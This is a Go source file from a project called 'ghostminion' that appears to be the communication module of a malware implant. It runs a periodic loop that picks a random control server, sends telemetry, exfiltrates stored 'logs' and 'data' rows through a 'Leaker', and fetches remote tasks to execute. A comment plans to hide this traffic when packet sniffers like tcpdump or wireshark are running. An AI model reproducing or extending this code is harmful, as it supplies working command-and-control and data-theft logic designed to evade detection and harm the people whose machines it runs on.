package communication

import (
	"encoding/json"
	"ghostminion/apps"
	"ghostminion/config"
	"ghostminion/db"
	"math/rand"
	"strconv"
	"time"
)

func Routine(taskCh chan<- apps.AppData) {
	conf, _ := config.GetConfig()
	intervalSeconds, _ := strconv.Atoi(conf.Communication.Interval)
	ticker := time.NewTicker(time.Duration(intervalSeconds) * time.Second)
	defer ticker.Stop()

	for {
		<-ticker.C
		serverConfig := getRandomServer()
		if !CanCommunicate(serverConfig) || !isSafeToCommunicate() {
			lgr.Error("Can't communicate with server", serverConfig.Address)
		} else {
			telemetry, err := NewTelemetry(true)
			if err != nil {
				lgr.Error("Can't create telemetry", err.Error())
			}
			if _, _, err = SendTelemetry(serverConfig, telemetry); err != nil {
				lgr.Error("Can't send telemetry", err.Error())
			}

			leaker := NewLeaker(
				[]db.TableConfig{
					{Name: "logs", BatchSize: 50},
					{Name: "data", BatchSize: 1},
				},
				serverConfig,
			)

			if err := leaker.LeakData(); err != nil {
				lgr.Error("Can't leak data", err.Error())
			}

			tasks := fetchTasks(serverConfig)
			for _, task := range tasks {
				taskCh <- task
			}
		}
	}
}

func fetchTasks(serverConfig config.ServerConfig) []apps.AppData {
	tasksRaw, _, err := SendRequest(
		GET,
		CreateRoute(serverConfig, "tasks"),
		map[string]string{
			"Accept": "application/json",
		},
		nil,
	)
	if err != nil {
		lgr.Error("Got error while fetching tasks", err)
		return nil
	}

	var tasks []apps.AppData
	if err := json.Unmarshal(tasksRaw, &tasks); err != nil {
		lgr.Error("Got error while unmarshalling tasks", err)
		return nil
	}

	return tasks
}

func getRandomServer() config.ServerConfig {
	configInstance, err := config.GetConfig()
	if err != nil {
		return config.ServerConfig{}
	}
	servers := configInstance.Communication.Servers
	if len(servers) == 0 {
		return config.ServerConfig{}
	}
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	index := rng.Intn(len(servers))
	return servers[index]
}

func isSafeToCommunicate() bool {
	/*
		don't leakDataAndGetTasks if there are sniffers (tcpdump, wireshark, etc..)
		don't leakDataAndGetTasks if there is too much cpu usage
		todo: search for more risky communication times
	*/
	return true
}
